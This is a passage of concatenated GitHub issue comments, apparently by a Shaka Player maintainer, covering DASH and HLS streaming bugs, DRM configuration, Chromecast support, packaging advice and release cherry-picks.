video.pause().\nSeek\nWill set video.currentTime, and will honor resumeState, if set.\nStop\nWill call player.unload().\nPlay\nWill call video.play().\nGet Status\nWill respond with a Media Status message to the requesting sender.\nSetVolume\nAccording to SDK docs, this should set video.volume, unlike other volume commands, which set system volume.\nRequired messages from receiver to sender\nError: Load Failed\nSent when a Load command fails.  Will be tied to player.load().catch(...).\nError: Load Cancelled\nSent when a Load command fails with LOAD_INTERRUPTED.\nMedia Status\nSent when a Get Status command is received.. Either next week or the following.. This was just released in v2.0.7.. Excellent.  Thank you for letting us know!. @Brahmasmi, I'm not sure.  Can you provide some docs on Icecast, along with some sample streams?  Can you describe in more detail how you want to use Icecast with Shaka Player?. Shaka Player has a plugin system for manifest parsers.  You could implement a manifest parser for Icecast (even though it seems to have no manifest).  The plugin only has to describe to Shaka Player how to stream that content.\nBecause Shaka Player is built on the MediaSource Extensions to HTML5 video which are provided by the browser, segments are a core concept for us.  That said, anything that MSE will accept is fine, and it doesn't have to be a \"segment\" per se.  We just have to be told what pieces of content to fetch (URL + byte range) and when (what timestamps will be found in each piece of the content).  If you can derive that info somehow, that's all we need to drive our streaming engine and MSE.\nMy team does not have time to develop an Icecast plugin (we are currently focused on HLS), nor can I make any promises about Icecast in the future.  But if you want to write an Icecast plugin yourself, we would be happy to offer your support as you learn the plugin interface and figure out how you can map Icecast to it.  I would also be happy to review a pull request to accept the Icecast plugin into our sources once you have something working.\nDoes this help?. With MediaSource, we must make requests in JavaScript through XHR and feed ArrayBuffers to a MediaSource SourceBuffer.  If you can't make byte range requests on Icecast, and you must do an indefinite streaming GET, I don't see any good way to play Icecast through MediaSource as it exists today.. Since Icecast is based on a \"hanging GET\" or \"long polling\" strategy (one, indefinite GET that doesn't terminate), I don't think Shaka Player is a good fit out of the box.  Our buffering system and use of MediaSource don't fit well with this.  We expect to request multiple chunks, and to stop requesting when our buffer limit is reached.\nUsing Fetch with streaming may allow you to fake what we're expecting, but at that point, I have to ask: why even use Shaka Player?  Our purpose is for adaptive bitrate, and the code is designed around that idea.  For a single stream, you could just use Fetch and feed the data to MediaSource directly.  If you aren't doing adaptive streaming, MediaSource is actually very simple to use.. @Brahmasmi, there is nothing offensive about your questions!  Please do not worry.  I am happy to have a conversation about this.  I hope I haven't been rude.\nI'm not opposed to Icecast support in any philosophical way.  My team is small and has other priorities, so we will not be implementing Icecast ourselves, but we are happy to offer support to anyone in the community who wants to work on Icecast.\nIf an Icecast plugin can be made to fit the Shaka Player architecture, I would be happy to review a pull request to bring it into Shaka sources.  If it can't be made to fit our architecture, then you are always welcome to fork Shaka and rearchitect it to fit your needs.  That's the advantage of open source!\nI acknowledge that Fetch+MediaSource is nothing like Shaka.  It doesn't solve the same problems.  I suggested it because it seems that Shaka doesn't solve the problem of Icecast particularly well, and an Icecast player using MediaSource was your stated goal.  I thought it might be an alternative worth considering, and it might solve your problem better than Shaka can it its current form.\nIn response to your comments about composability, Shaka Player's internals are not composable as such.  What you're seeing is Shaka Player's plugin architecture.  For example, as you pointed out, HTTP network requests are supported via the HTTP plugin.  There are also parsing plugins for text streams, such as WebVTT and TTML.  Finally, there are manifest parser plugins for things like DASH and HLS. \n In this architecture, Icecast support would be theoretically be a new manifest plugin.\nHowever, the rest is not modular.  For example, StreamingEngine works one way.  It requires a certain kind of data to work, namely a list of independently-fetchable media segments and information about their timestamps.  StreamingEngine is core to Shaka Player's design, and as far as I can tell, Icecast cannot directly provide what StreamingEngine needs.\nSo if Icecast looked trivial to support, I would consider adding to the roadmap for my team.  However, it looks highly non-trivial because Icecast's design it as odds with our own.\nYour options, in summary:\n  - Find a clever way to build an Icecast plugin for Shaka Player that feeds our StreamingEngine\n    - docs for ManifestParser interface\n    - docs for the Manifest structure which feeds StreamingEngine\n  - Fork Shaka Player to better fit Icecast\n    - You may want to focus on modifying or replacing StreamingEngine\n  - Create something else using MediaSource and Fetch\n    - I can provide pointers to MediaSource docs to help with this.\nPlease let me know if there's anything else I can do to help.. We are always happy to help.  If you need assistance with Shaka or MediaSource, please let us know, either here or on our users list.  Thanks!. That asset is still referenced by existing versions, so any updates should be made by forking that asset for v2.1.0 and leaving the existing one where it is.. Adding this optimistically to the v2.1.0 milestone.  If we finish HLS before we finish this, we'll bump this feature to the next release.. Clear Key content does not require a license request, so there is no dependency on a license server when offline.  However, Clear Key is not secure in terms of content security.\nShaka Player's offline storage system is built to store everything offline, including the license for protected content.  Without persistent license support, Shaka Player can't store protected content offline.  It is feasible to store the content offline without a license, then use Clear Key to decrypt, but Shaka Player is not designed that way.. Of course, Shaka Player is open source, so you can always modify it to suit your needs.  The classes you would be interested in are DrmEngine, in lib/media/drm_engine.js, and Storage, in lib/offline/storage.js.\nSorry we can't help you directly with this.  Let us know if there is anything else we can do, or if you need further guidance through the code base.. Where we call drmEngine.init in Storage, there is a boolean parameter set to true to tell DrmEngine that we need persistent sessions.  You could make this false for Clear Key.  That should allow you store the content offline.\nIn Storage.prototype.createOfflineManifest_, we store the session IDs to load them again later.  For Clear Key, that array of session IDs should be empty instead.  Otherwise, we would try to load those sessions and fail.\nThat should be a start, but I'm not sure if that's everything.  Let me know how it goes.. @phamduongnhatnam, I'm glad I could help.  If you think there would be value in this feature for others, feel free to make a pull request.. There may be something wrong with our 4k detection in lib/cast/cast_receiver.js.  We'll take a look.  Thanks!. (Please note that 4k resolutions will not be made available on a non-4k TV, even if the device is a Chromecast Ultra.  The Chromecast's resolution support check is based on the TV itself, as well as the device.)\nDetection of 4k on Chromecast Ultra was introduced in v2.0.4, but our receiver app ID was still configured to serve v2.0.2.  This has now been updated to the latest, v2.0.6.  If you reboot the Chromecast, it should pick up the new URL and get the correct receiver app version.\nI have updated the config, rebooted my Ultra, and tested with this up-to-date version on a 4k TV.  I am now seeing 4k resolutions available.  Sorry for the trouble!. You can get a list of tracks with player.getTracks().  See the bandwidth field of the track, which is in bits/sec.  You can get stats about buffering (stalls) via player.getStats().\nFor more details, please see the docs:\n  Player: https://shaka-player-demo.appspot.com/docs/api/shaka.Player.html\n  Tracks: https://shaka-player-demo.appspot.com/docs/api/shakaExtern.html#Track\n  Stats: https://shaka-player-demo.appspot.com/docs/api/shakaExtern.html#Stats\nLet us know if there's anything else we can do.. @utkubulkan, I hope we have answered your question.  I will close the issue now, but we can reopen it if you need further assistance.  Thanks!. @baconz, this is very interesting.  I'm glad that this is a workable approach for you, but I would like to defer consideration of this PR until we are done with #555.  At that point, if our solution does not meet your needs, we can reconsider this PR or something based on it.  In the mean time, I'm glad you are not stuck waiting on us!. @baconz, we recently landed gap jumping in #555.  Is this PR still applicable?  Or does gap jumping solve the same problem this PR is meant to solve?. Okay, I see now.\nI understand the need for this, but I am still hesitant because this feels like a lot of code to work around a Chrome bug.  I don't know when, but this will get fixed in Chrome at some point.\nHow would a user of this feature employ it only on Chrome, and only on affected versions of Chrome?. @baconz, I've been informed by the Chrome team that they are actively working on this and hope to land something soon.\nSince you have this workaround implemented in your fork, there's no urgency to merge it, correct?  If so, I propose we defer for a couple more weeks to see what Chrome team can accomplish in terms of a fix in that time.. @baconz, I know this has dragged on for quite some time, but would you be willing to test another round of Chrome fixes with regard to this issue?\nIn particular, you should use Chrome beta (63) with the MseBufferByPts feature turned on via the command-line:\njs\ngoogle-chrome-beta --user-data-dir=/tmp/user-data --enable-features=MseBufferByPts\nI only recently became aware of the fact that Chrome team is experimenting with PTS-based buffering behind this flag, to avoid accidentally breaking any media sites that may only work with the buggy behavior they are trying to fix.. Alternately, a test case or demo page that showcases the problem would be allow us to go directly to Chrome team with your specific use case, and allow them to iterate more quickly toward fixing the issues that are affecting you.. I believe the Chrome DTS/PTS bug has now been fixed, so I'm closing this PR. If you still have issues with the latest stable release of Chrome, please file a new issue/PR. Thanks!. Since this seems to be the same issue as #555, I'm going to close it as a duplicate.  We'll be addressing #555 as soon as possible.  Thanks!. Hi @radiantmediaplayer, @ebeffim, we will take a look.  Thank you for the report.. The manifest at http://live1.karwan.tv/karwan.tv/vin-tv/manifest.mpd is failing due to clock sync issues with your server.\nI fetched a copy of the manifest at unix timestamp 1490560582 (attached).  The manifest's availabilityStartTime attribute says 2017-03-25T14:59:56Z, which is timestamp 1490453996.  This means the stream has been available for 1490560582 - 1490453996 = 106586 seconds.  So the largest timestamp in the media should be close to 106586 (give or take one segment).  The timeShiftBufferDepth attribute is 45 seconds, to the smallest timestamp in the media should be close to 106586 - 45 = 106541.\nThe first segment in the video stream's SegmentTimeline is at media time 11977175632.  Divide by timescale 90000, and you get time 133079.  The last timestamp in the timeline is 11977175632, + 6 segments with length 900000, which gives 11982575632.  Divide by timescale 90000, and you get time 133139.\nSo SegmentTimeline shows the range 133079 to 133139, while the MPD element shows the range 106541 to 106586.  The ends of those ranges are offset by 133139 - 106586 = 26553 seconds = roughly 7.3 hours.\nYour server's clock is therefore off by 7.3 hours, which causes it to present an inaccurate timeline, which causes Shaka Player to request segments that won't be available until 7.3 hours in the future.\nI don't know much about Nimble Streamer, so I can't say for certain how you should fix this, but I have a few guesses.  One of these should solve your problem:\n\nIf you're in control of your server and its clock, make sure your server is using NTP and always has an accurate clock.  This is critical for live streaming.  The DASH-IF Interoperability Points v4.0 has this to say on the subject:\n3.5. Synchronization Considerations\nIn order to properly access MPDs and Segments that are available on DASH servers, DASH servers and clients should synchronize their clocks to a globally accurate time standard. Specifically it is expected that the Segment Availability Times as computed from the MPD according to ISO/IEC 23009-1 [4], section 5.3.9.5 and additional details in ISO/IEC 23009-3 [6], section 6.4 are accurately announced in the MPD.\n\n\nIf you're not in control of the server and its clock, you must provide a UTCTiming element in the manifest so that the client has a way to synchronize with the server's idea of the current time.  You may need to update Nimble Streamer, configure it, or file a support request with the author.  Again, quoting DASH-IF Interoperability Points v4.0:\n4.7.2. Service Provider Requirements and Guidelines\nIf the Media Presentation is dynamic or if the MPD@availabilityStartTime is present then the service shall provide a Media Presentation as follows:\n- The segment availability times announced in the MPD should be generated from a device that is synchronized to a globally accurate timing source, preferably using NTP.\n- The MPD should contain at least one UTCTiming element ...\n- If the MPD does not contain any element UTCTiming then the segments shall be available latest at the announced segment availability time using a globally accurate timing source**.\n\n\n\nPlease feel free to reference this analysis and recommendations in any bug report you may file with Nimble.  Thanks!. Hi @radiantmediaplayer, @alexpokotilo,\nIn the past (Shaka Player v1), we attempted to work around problems in DASH manifests such as this one.  Those work-arounds caused bugs and maintenance challenges that my team could not keep up with.  In some cases, these work-arounds event caused us to fail on IOP-compliant content.\nTherefore, we decided that Shaka Player v2 would be more strict in how we interpret and implement the spec.  This means we won't try to cope with or fix up non-compliant content.  I believe that Shaka Player is a more stable, interoperable product because of that decision.\nI apologize for being inflexible on this point, but the beauty of open source is that you can always make a fork and change Shaka's behavior until you are able to solve the content issue.  And when your content does follow IOP, you will be able to confidently play that content not just in Shaka Player, but in any interoperable player.\nThanks for reaching out, and please do let us know if you need anything else.. Hi Oren,\nIn Shaka Player, AbrManager is the component which makes all ABR decisions, including the initial choice of tracks.  You can plug in your own ABR logic, but the default makes decisions based on a bandwidth estimate.\nBefore the ABR system has enough information to accurately estimate bandwidth, a default estimate is used, and this in turn dictates the first tracks selected.  Typically, the initial track is shown for about 2 segments while we build an estimate, but for content with 10-second segments, this can be 20 seconds of playback.\nThe default estimate can be configured by the application.  For docs, see:\nhttps://shaka-player-demo.appspot.com/docs/api/shaka.Player.html#configure\nhttps://shaka-player-demo.appspot.com/docs/api/shakaExtern.html#AbrConfiguration\nHere's a quick example that sets the default bandwidth estimate to 1 Mbit:\njs\nplayer.configure({\n  abr: {\n    defaultBandwidthEstimate: (1<<20)  // unit: bits/sec\n  }\n});\nDoes this answer your question?. I am not aware of anything in the spec that would insist we start with the first without regard for bitrate, but I can't claim to know the whole spec by heart.  In any case, we always choose based on bitrate when the default AbrManager is used.. Always happy to help.. Is the page URL http or https?. Okay, makes sense.  Starting in Chrome 58, EME and therefore protected content are only possible via https or localhost.  This is to keep Chrome's implementation in line with changes in the spec which require a secure context for EME.  You can find Chrome's announcement here and our own announcement here.. Do you mean the amount of media data Shaka Player requests?  Shaka requests one segment at a time, and the segment size is set when the content is created.  For example, 10 second segments are common for VOD DASH content, and Apple's HLS tools have a default of 6 second segments.  The demo assets we created use 4 second segments, because we found that to be a good balance between overhead and adaptation speed.\nDoes this help?. Shaka Packager creates 10-second segments by default, but you can control that with a command line flag.  When I created content for the Shaka Player demo (using Shaka Packager), I set that flag to 4 seconds.  You can set that to whatever you wish when you package your content.\nI recommend you set both --segment_duration and --fragment_duration when you package your content, and set them to the same value (in seconds).  This value should be a multiple of the GOP size you used when you encoded the content.  For ffmpeg, this is controlled by -g and -keyint_min, both of which I recommend you set to the same value (in frames).\nFor example, for 24 fps content and 4-second segments, 24 * 4 = 96 frames per segment.  So you would use ffmpeg ... -g 96 -keyint_min 96 ... and packager --segment_duration 4 --fragment_duration 4 ...\nI hope that helps!. This seems to be resolved now, so I will go ahead and close.  Let us know if you need any more help with this, and we can reopen.  Thanks!. Neither the sampling rate of the audio nor the frame rate of the video is changed by the packager.  If you start with 44kHz audio and 24fps video, you will have 44kHz audio and 24fps video after packaging.\nYou can change those things in ffmpeg if you wish, but by default, the output from ffmpeg will have the same sampling rate and frame rate as the input did.. Can you define what you mean by \"delay\" here?  Delay of what?. We don't expose segment delay currently, but we track segment download times to build our bandwidth estimate.  You may want to tinker with shaka.abr.EwmaBandwidthEstimator, specifically the sample method which receives the raw data from shaka.net.NetworkingEngine.\nSince we're buffering ahead, we will (ideally) not experience that delay as a buffering delay.  If you want to get information about the time the player spends buffering vs playing, you can get that from player.getStats().  In the latest code in master, we expose loadLatency (introduced in v2.1.x, time between load() call and playback of the first frame), playTime (total time spent in a playing state), and bufferingTime (total time spent in a buffering state).\nP.S.: My email address is in the CONTRIBUTORS file if you want someone to give you feedback on your thesis.  :-). Wow, this hung my tab in Chrome.  We will look into it.  Thanks for the report!. Infinite loop!  :scream:\nWhen we build a list of segments to download, we ask the stream for the next segment until it returns null.  This manifest uses SegmentTemplate, so a reference can be calculated for any segment number.  But for VOD, we should take the period duration into account and not return references that should not exist.. I'm putting it in the v2.1 milestone for tracking purposes, but we will cherry-pick the fix to our next bug fix release, v2.0.7.. This was just released in v2.0.7.. We are always happy to help.. Thanks for letting us know you're interested!\nWe've been working on it, but we have not been able to complete the work yet.  The model for live streaming in HLS is different from the DASH model, and we still have some serious refactoring to do.. Yes, we are aware.  There are several more commits coming that will finish the implementation.  It's not quite done yet.. There is one more bug I am aware of in our HLS live implementation.  I've just tracked down the root of it and written a failing test, and I expect to be able to fix the bug soon.  After that, we will close this issue and try to wrap up v2.3.. @avelad, I will give those a try and see if it's the same bug I'm already working on.. @avelad, it looks like a different bug, specific to TS live streams.  Can you file a new one, please?\nWe parse the TS segments to get their timestamps, since HLS doesn't provide that information.  However, as far as I can tell, the MP4 output from mux.js has different timestamps than what we parsed from the TS segments.  So the MediaSource timeline doesn't line up with the Player's seek range.. I'm not sure what's wrong with the second stream.  It's different from the other issues, though.  Can you file a new bug for that, too?  Please use the issue template to capture details on the behavior you're seeing.. Modulo separate issues raised by @avelad, HLS live is working in the master branch and in the nightly build (which I just updated a few hours early).\nWe're going to close this (very general) issue now.  If you find problems with HLS live in the nightly build (as @avelad has), please file new issues so that we can focus on those individual bugs.  Thanks!. Without reconstructing a container for the I-frames, this is infeasible on top of MediaSource.  Closing this feature request.. @sirpy, this is the original issue regarding TS segments in Safari.. TS via MediaSource is still failing in Safari 11 Tech Preview.. Could be solved by transmuxing (#887). After #887, we will need to polyfill Safari's MSE implementation to reject TS.  Then TS will be transmuxed on Safari, bypassing their MSE+TS bugs.. Cherry-picked to v2.2.3.. I've just updated the v2.2.0 milestone and bumped some enhancements down to v2.3.0.  I hope we will be able to wrap up v2.2.0 by the end of the month.. Thanks for the report!  We'll look into it.. This fix is being cherry-picked to v2.1.1.. Also cherry-picked to v2.0.9.. @sivarajendranaidu, I believe if you open the JS console, you'll see an error message from the browser stating that you do not have cross-origin access to that license server.  Is that correct?. I expect this is the same cause as this report on the packager side: https://github.com/google/shaka-packager/issues/171. @sivarajendranaidu, since you report in https://github.com/google/shaka-packager/issues/171#issuecomment-292010681 that this is working with a different license server, I'm going to go ahead and close this issue.  Thanks!. As I understand it, this also means the demo app is consuming more battery than it should on mobile devices and laptops.  Is that correct?. @jbauman2 The next nightly build should be much improved: https://nightly-dot-shaka-player-demo.appspot.com/  Thanks!. Normally, the manifest either contains all necessary init data or none at all.  So to make it work with Shaka Player as designed today, you can either:\n\nRemove cenc:pssh from the manifest and rely on the PSSH boxes in the media (assuming the media itself contains PSSH boxes for both Widevine & PlayReady)\nAdd a cenc:pssh element for the PlayReady PSSH.\n\nAre either of these options feasible for you?. Let's see what we could come up with to allow you to override this.\nI could imagine a new option in the advanced drm configuration that would allow you to specify init data.  This would override both manifest and media init data.  If we implemented this solution, could you supply the PlayReady init data that is missing from the manifest?\nI could also imagine a new option in the dash parser configuration that would ask the parser to ignore the init data from the manifest.  For this to solve your problem, the media would have to contain both PlayReady and Widevine init data.  Is this the case for your media?. If the manifest doesn't indicate PlayReady support at all, we could offer an option to say \"ignore the DRM info in the manifest completely\", including key systems.  This would treat any DASH manifest with <ContentProtection> as if it signaled no particular key systems and contained no init data.. Sorry, I missed your question earlier:\n\ni'm wondering what could be the problem with just changing the actual behaviour of not checking the first chunk for playready when widevine pssh data is in the manifest. Isn't it simpler? Or this means trouble for somebody?\n\nDASH states that init data in the manifest overrides init data in the content.  It's as simple as that.  So if we have init data from the manifest, we don't listen for init data from the content.  We can offer an option to disregard the manifest init data instead, but this would not be the default.\nDoes that make sense?\nAnd as my colleague pointed out, the manifest specifies Widevine but not PlayReady, so that's another layer.  When we see that information in the manifest, we believe it and we don't try PlayReady.  We could optionally ignore this, as well.\nFor any of this to be effective, your media would have to include PSSH boxes for both Widevine and PlayReady.  I examined one of the init segments from your manifest and found that in this case, it does contain both.. I will update the title of the issue.  I've marked this feature tentatively for v2.2, but we may be able to cherry-pick it to other branches once implemented.. @hghazzi, I can't access that stream.  I get an HTTP 403 error.. Previous versions of Safari were based on EME v0.1b (non-object-oriented) with a webkit prefix.  The new version is object-oriented, but not up to recent standards, and still with a webkit prefix.\nWe never supported fairplay with the old version, but we will endeavor to support it with the new version.\nI will close this as a duplicate of #382.  Thanks!. It appears that the license server is having intermittent failures.  The failure seems to be triggered by the service certificate requests being sent by Chrome 58+.  For now, I am marking this as \"external bug\" until we have more information.. As I said, this appears to be a bug in the license server, specifically the UAT server.  There is nothing to be done on the client side, and this appears to be affecting platforms other than desktop Chrome.  Please stand by, and I will confirm here when the server problem has been fixed.. Yes, I can confirm that the issue with UAT has been fixed.\nThe sample code provided by Widevine shows how to avoid the extra request made by the CDM to provision the server certificate.  If you provide the CDM with a certificate in advance, it won't have to request one.  This is an optimization that is not required, but Shaka Player supports through configuration.\nI don't have a good answer on where you should get this certificate from.  I will work to clarify that, and make an announcement on the shaka-player-users list when I have that information.  In the mean time, everything should still work.\nSince the bug in UAT is fixed, I'm going to close this issue.  Thanks, everyone, for your patience.. Please refer to Widevine support for license server issues.  Shaka Player has no control over that.  We apologize for the inconvenience.. This looks like a time sync issue.  Can you provide us with a link to the specific live stream you are using?  Do you have issues with the live sim that appears in our list of demo assets under the DASH-IF heading?. Yes, you can send it privately.  My email is in CONTRIBUTORS.\nIt's not surprising that dashjs plays it.  Some live stream encoders produce content that does not accurately represent the presentation timeline.  Dashjs has some way of handling various kinds of not-quite-right content.\nCan you tell me what encoder/packager/etc is used to produce your stream?  Have you checked for updates from them, in case this is a bug they have already fixed?. @OrenMe, did we answer your question?  Is there anything else you need?. I can reproduce.  Not sure what's going on yet.. \"Angel One\", multicodec (MP4 + WebM), Firefox on Linux:\n - works in the clear\n - fails to decode with Widevine\n - fails to start at all with ClearKey\n\"Tears of Steel\", MP4 only, Firefox on Linux:\n - works in the clear\n - works with Widevine\n\"Angel One\", same as above, but forcing the player to ignore Firefox's reported support of Opus:\n - works in the clear\n - works with Widevine\n - fails to start at all with ClearKey\nSo it seems that ClearKey is generally broken on Firefox, and so is the combination of Opus+Widevine.  I will file bugs on Mozilla.. ClearKey is working on Firefox with the nightly build of Shaka Player.\nBug filed for the Opus failure: https://bugzilla.mozilla.org/show_bug.cgi?id=1357133. It appears that this has been fixed in Firefox.  I tested in Firefox 53 on Mac.. @phamduongnhatnam, can you reproduce this issue:\n\non desktop Chrome?\non Android Chrome directly without Crosswalk or Cordova?. @phamduongnhatnam, I can't support Cordova or Crosswalk directly, but since you can reproduce slow deletes on desktop Chrome, it should be easy enough for us to look into.  Thanks for the report.. This fix was just released in v2.1.2.. I'm just the messenger!  Thanks belong to @vaage for this one.. The 00 byte at the end of the string is the \"terminated\" part of readTerminatedString.\n\nWe based this code on the spec, which I will double-check.  In the mean time, can you provide a sample?  What packager/encoder produced this sample?. Here's the definition of the emsg box in the DASH spec, ISO 23009-1:2014:\n``\n5.10.3.3.2 Definition\n  Box Type:emsg`\n  Container: Segment\n  Mandatory: No\n  Quantity: Zero of more\n5.10.3.3.3 Syntax\naligned(8) class DASHEventMessageBox extends FullBox(\u2018emsg\u2019, version = 0, flags = 0) {\n  string scheme_id_uri;\n  string value;\n  unsigned int(32) timescale;\n  unsigned int(32) presentation_time_delta;\n  unsigned int(32) event_duration;\n  unsigned int(32) id;\n  unsigned int(8)\n  message_data[];\n}\n```\nSo the bytes after \"scheme_id_uri\" can't be a size as you said, since it is followed by \"value\".  I will dig up the definition of \"string\" to confirm that it contains a terminating nul character.. Thanks for letting us know!. Text tracks are separate from variants.  Look for type == 'text'.\nThe combined codecs in variants is another side-effect of our HLS support, but I think we can probably change it.  Would you prefer to see audioCodec and videoCodec in separate fields?. Counting audio channels in DASH is complex.  There is another issue filled for that already (#424).  I'll update that issue soon with more details.\nI'm fairly sure we can split up the codecs, though.. This is now fixed in master, and I intend to cherry-pick it for v2.1.1 in the near future.  You can see it now in our nightly build.  Please let us know if this meets your needs.. Cherry-picked to v2.1.1.. Design from @TheModMaker:\n\nNext to each build, output a manifest of the input JS files that went into that build.\nWhen asked to build, check for this manifest and compare it to the list of inputs files for this build.\nIf the list has changed, rebuild regardless of changes to the source files.. @boredom2, I understand your confusion.  I mentioned this in the release announcement, but it's not obvious at all.\n\nCDNJS is populated automatically from npm (by a robot controlled entirely by CDNJS).  The CDNJS distribution therefore always lags behind npm by a few days.\nIf it doesn't show up in one week, file a bug at https://github.com/cdnjs/cdnjs to let them know that their update bot is not working.. Always happy to help!. This has been cherry-picked to v2.1.1 and v2.0.9.. This should have been fixed in #620 such that there were no retries.\nI'm fairly sure the severity should be \"recoverable\", though.  In the case of a license request failure, we don't know it's fatal.  If there were multiple requests that covered the same keys (which can happen with some content), the failure of an initial license request would not be fatal.  In the case of a failed renewal, a later renewal could still extend the license before the keys expire.  Because of these things, I'm not sure there's any way for us to confidently label such a failure as \"fatal\".. We will look into the retry issue.  Thanks for the report!. Cherry-picked to v2.1.3.. @Ross-cz, I'm closing this issue and merging it into #960, in which I've proposed a more general solution.  Please provide feedback there.  Thanks!. This feature will be out in v2.4 this week.. Since we have no plans to support this feature at this time, I'm marking this as \"will not implement\" and closing.  If you feel strongly about it, please let us know and we can discuss further.. I don't see why not.  We'll do that, as well.. No, I think we can do that here.. There can only be one label (one label attribute in DASH, one NAME attribute in HLS).  There can be multiple roles in DASH, so the exposed role information will be an array.\nBoth accomplish similar goals.  Whichever is used by your content/encoder, we will expose the information so that your application can use it to make decisions.. The first part of this fix has been cherry-picked to v2.1.3.. Yes, I see no problem cherry-picking these to v2.2.3, which I hope to release this week.. This is being cherry-picked to v2.1.1.. @geniusq1981, this was fixed in v2.1.1 and v2.2.0 back in May.  If you are having issues with the latest release, please file a new issue and provide a content URL so that we can reproduce the issue.  If you cannot provide a manifest URL publicly, the issue template contains an email address where you can send the link privately, in addition to your public bug report.  Thanks!. Since there has been no reply in over two weeks, I'm going to close this issue.  @dakom, we can reopen any time if you still need help with this.. @avelad, my best guess is that the issue might be with Samsung's implementation of EME v0.1b.  Let me consult with a colleague of mine and see if there's any way we can get access to a Tizen TV for testing.. I don't have access to a Tizen TV.  Can you recommend a way for me to reproduce and work on a fix?. No problem.  I am happy to leave the issue open for you.\nIf you can develop an appropriate polyfill for Tizen, you could send us a PR.. I don't see anything obviously related in #752 (which is about Safari), and your comment link does not go to a specific comment.  Can you clarify?. Ah, I see.  Thanks for the details!. I don't think we'll be able to look into this until we get our own Tizen TV for testing.  In the mean time, a PR is welcome if you figure it out on your own.. @codegastudio, we don't have any experience with Angular or TypeScript, so I'm not sure how that \"import\" statement works.  It's likely that we don't have support for that loading mechanism in our wrapper.  See build/wrapper.template.js for the current wrapper mechanism, which supports CommonJS and AMD loaders.\nI'm going to tentatively mark this as \"enhancement\" to support this type of import, but again, I don't know what's involved yet.. I've been looking at TypeScript a bit.  Can you try this?\nts\nimport * as shaka from \"./shaka-player.compiled.js\"\nshaka.polyfill.installAll();. I'm not clear on what you mean by \"AES encryption\".  I'm aware of several mutually incompatible media encryption schemes based on AES-128: CTR mode vs CBC mode, pattern encryption vs no pattern, and encryption of samples vs the whole container.  So those 3 choices give you 8 conceivable schemes.\nNote that I've only seen 2 schemes in the wild so far:\n  1. AES-128-CTR with no pattern, encrypting the samples only (AKA CENC 2.0, common in DASH content)\n  2. AES-128-CBC with pattern encryption, encrypting the samples only (AKA HLS's \"SAMPLE-AES\")\nCan you provide more information on the specific encryption scheme you're trying to get support for?  I see urn:mpeg:dash:sea:aes128-cbc:2013 in the manifest you linked, so I assume it's some CBC-based scheme, but I will need more details to provide further guidance.. Widevine does not support CBC in a browser yet.  Presumably, since this is a Microsoft stream, PlayReady already does support CBC.  But until I can test, I'm just assuming.\nCan you provide a license server URL so that we can try this stream?  There may be some way to support it via PlayReady on Edge.. @boredom2, can you provide us with a license server endpoint to test this stream on Edge?  You can send it to shaka-player-issues@google.com if you don't want to send it publicly.. Closing due to inactivity.  Let us know if you still need help with this, and we can reopen.. @ZmGorynych, if you can provide a sample manifest and license server for testing, please file a new issue and we will schedule the enhancement.. @rajlaxmi28, @sivarajendranaidu, do you have a license server URL for Widevine as well?  It might be useful to compare working vs non-working playback on the same content.\nIt seems that some part of this content might be incompatible with either PlayReady or the media stack in Edge.  I'm not sure if they support \"clear lead\" content or not, and I'm not sure where they would have that documented.  I recommend that you file a ticket with Microsoft about this.  If you do, please link to it here so we can follow along.\nHere's a link to the demo with your URLs pre-filled: https://shaka-player-demo.appspot.com/demo/#asset=//115.119.242.24/mm/dash/vod/flr/test1/VODSERVICE_1234/TG_TEST_SD.mpd;license=//115.119.242.24/drmclientproxy/playready/get_license\nNote, though, that your links are plain HTTP, and will not be accessible to an app running on HTTPS.  You will want to run an SSL-enabled service on port 443 before sending the above link in a Microsoft ticket.. Okay.  Seems to be fixed in EdgeHTML 14, so I'm going to close it now.  Thanks for the report!. This is certainly not intentional.  We don't get the same behavior on Linux, but we'll try to reproduce on Windows.. I tested on Windows 10 with npm 3.10.3, in a clean checkout at rev 0698987836bb68d0e35377ae9be8d3bcb8d4f492.\nI find that npm install run manually does not pollute the folder with node bin files.\nHowever, if I wipe out node_modules and run python build/all.py, letting it run npm install for me, I can reproduce the pollution:\n```\n$ git status\nOn branch master\nYour branch is up-to-date with 'origin/master'.\nUntracked files:\n  (use \"git add ...\" to include in what will be committed)\n    esparse\n    esparse.cmd\n    esvalidate\n    esvalidate.cmd\n    htmlhint\n    htmlhint.cmd\n    in-install\n    in-install.cmd\n    in-publish\n    in-publish.cmd\n    karma\n    karma.cmd\n    not-in-install\n    not-in-install.cmd\n    not-in-publish\n    not-in-publish.cmd\n    r.js\n    r.js.cmd\n    r_js\n    r_js.cmd\n    rimraf\n    rimraf.cmd\n\nnothing added to commit but untracked files present (use \"git add\" to track)\n```\nThere must be something we're doing wrong.  We'll investigate further.. I don't think we're interested in moving the build scripts to nodejs at this time.  We use python in our test lab infrastructure, so it is useful for us to be able to import those build scripts as part of our automation.. With npm v3.10.3:\nnpm.cmd update does not pollute the root folder.\nnpm.cmd --prefix C:/cygwin64/home/user/shaka-player update does pollute the root folder.\nnpm.cmd --prefix . update does pollute the root folder.\nSince npm behaves differently on other platforms, and the behavior is specific to --prefix it seems to be a bug in npm --prefix on Windows.. I filed npm/npm#17027 to fix the behavior of --prefix.  In the mean time, we may be able to work around it.. I'm going to run this through the build bot now, but we will also need to do a manual test in our lab to confirm.  Thanks!. I have confirmed that fullscreen on IE 11 throws when it tries to proxy the event.  The build bot ran the linter, compiler, and all the automated tests.  Looks good to me!. I just confirmed the fix, which led me to #787.  Thanks for the PR!. Cherry-picked to v2.1.1 and v2.0.9.. Cherry-picked to v2.1.1.. Cherry-picked to v2.1.1.. Sounds good to me.  I will check out the PR.. Cherry-picked to v2.1.1 and v2.0.9.. @TheJohnBowers, I can see that there is a corporate CLA on file for Verizon Digital Media Services.  So the CLA bot must be mistaken.  I will report this to the maintainers of that bot and we can proceed.. The CLA bot maintainers have informed me that you need to get yourself added to a group that associates you with the corporate CLA.  The maintainer of the group at Verizon Digital Media Services is Daniel Sanders.  When you have been added, just comment on the PR and the bot will re-check the group.. Thanks!. Cherry-picked to v2.1.1 and v2.0.9.. This is more difficult to reproduce in the latest code.  We no longer continue to retry a manifest request on a 404 or 403 error.  It is easier to reproduce now by setting a large maxAttempts (like 1000) and a small timeout (like 1 ms).\nIt seems that you are right.  I'm not seeing any effect from player.load() while it is fetching a manifest.. A note for whoever picks up this bug: It would be ideal to start by writing a new test that reproduces this bug, perhaps in the 'load/unload' section of test/player_unit.js.. I'm planning to cherry-pick this to v2.1.1.. Cherry-picked to v2.1.1.. It is easy enough to fix the failure, but we will lose type-checking on the 